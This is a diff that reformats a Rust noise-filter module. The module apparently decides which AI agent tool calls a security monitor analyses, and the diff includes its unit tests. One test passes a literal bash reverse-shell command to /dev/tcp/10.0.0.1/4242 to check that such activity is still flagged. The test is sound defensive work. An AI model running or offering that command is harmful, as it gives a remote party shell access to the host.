@@ -52,10 +52,7 @@ struct CompiledRule {
 
 impl CompiledRule {
     fn compile(rule: &NoiseRule) -> Option<Self> {
-        let tool_regex = rule
-            .tool_pattern
-            .as_ref()
-            .and_then(|p| Regex::new(p).ok());
+        let tool_regex = rule.tool_pattern.as_ref().and_then(|p| Regex::new(p).ok());
         let argument_regex = rule
             .argument_pattern
             .as_ref()
@@ -93,9 +90,7 @@ impl CompiledRule {
             }
         }
         // At least one field must be present for the rule to match
-        self.tool_regex.is_some()
-            || self.argument_regex.is_some()
-            || self.server_glob.is_some()
+        self.tool_regex.is_some() || self.argument_regex.is_some() || self.server_glob.is_some()
     }
 }
 
@@ -163,11 +158,7 @@ impl NoiseFilter {
             .into_iter()
             .map(|p| CompiledProfile {
                 name: p.name,
-                rules: p
-                    .rules
-                    .iter()
-                    .filter_map(CompiledRule::compile)
-                    .collect(),
+                rules: p.rules.iter().filter_map(CompiledRule::compile).collect(),
             })
             .collect();
 
@@ -191,19 +182,12 @@ impl NoiseFilter {
 
     /// Create a noise filter from explicit profiles and custom rules
     /// (useful for testing).
-    pub fn from_parts(
-        profiles: Vec<ActivityProfile>,
-        custom_rules: Vec<NoiseRule>,
-    ) -> Self {
+    pub fn from_parts(profiles: Vec<ActivityProfile>, custom_rules: Vec<NoiseRule>) -> Self {
         let compiled_profiles = profiles
             .into_iter()
             .map(|p| CompiledProfile {
                 name: p.name,
-                rules: p
-                    .rules
-                    .iter()
-                    .filter_map(CompiledRule::compile)
-                    .collect(),
+                rules: p.rules.iter().filter_map(CompiledRule::compile).collect(),
             })
             .collect();
 
@@ -225,12 +209,7 @@ impl NoiseFilter {
     ///
     /// Returns `true` if the event should be analyzed (not noise),
     /// `false` if the event is noise and should be suppressed.
-    pub fn should_analyze(
-        &mut self,
-        tool_name: &str,
-        arguments: &str,
-        server_name: &str,
-    ) -> bool {
+    pub fn should_analyze(&mut self, tool_name: &str, arguments: &str, server_name: &str) -> bool {
         self.stats.total_events += 1;
 
         // Check built-in profiles
@@ -398,21 +377,13 @@ mod tests {
     #[test]
     fn test_compiler_target_dir_filtered() {
         let mut f = make_filter();
-        assert!(!f.should_analyze(
-            "read_file",
-            "/project/target/debug/main",
-            ""
-        ));
+        assert!(!f.should_analyze("read_file", "/project/target/debug/main", ""));
     }
 
     #[test]
     fn test_compiler_node_modules_filtered() {
         let mut f = make_filter();
-        assert!(!f.should_analyze(
-            "read_file",
-            "/project/node_modules/lodash/index.js",
-            ""
-        ));
+        assert!(!f.should_analyze("read_file", "/project/node_modules/lodash/index.js", ""));
     }
 
     #[test]
@@ -450,11 +421,7 @@ mod tests {
     #[test]
     fn test_pkg_lockfile_filtered() {
         let mut f = make_filter();
-        assert!(!f.should_analyze(
-            "read_file",
-            "/project/package-lock.json",
-            ""
-        ));
+        assert!(!f.should_analyze("read_file", "/project/package-lock.json", ""));
     }
 
     #[test]
@@ -484,11 +451,7 @@ mod tests {
     #[test]
     fn test_ide_copilot_filtered() {
         let mut f = make_filter();
-        assert!(!f.should_analyze(
-            "getCompletions",
-            "{}",
-            "github-copilot-server"
-        ));
+        assert!(!f.should_analyze("getCompletions", "{}", "github-copilot-server"));
     }
 
     #[test]
@@ -584,11 +547,7 @@ mod tests {
     #[test]
     fn test_bash_reverse_shell_not_filtered() {
         let mut f = make_filter();
-        assert!(f.should_analyze(
-            "bash",
-            "-c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'",
-            ""
-        ));
+        assert!(f.should_analyze("bash", "-c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'", ""));
     }
 
     #[test]
@@ -756,7 +715,10 @@ mod tests {
     #[test]
     fn test_glob_match() {
         assert!(glob_match("*lsp*", "my-lsp-proxy"));
-        assert!(glob_match("*language-server*", "typescript-language-server"));
+        assert!(glob_match(
+            "*language-server*",
+            "typescript-language-server"
+        ));
         assert!(!glob_match("*lsp*", "my-server"));
         assert!(glob_match("exact", "exact"));
         assert!(!glob_match("exact", "not-exact"));
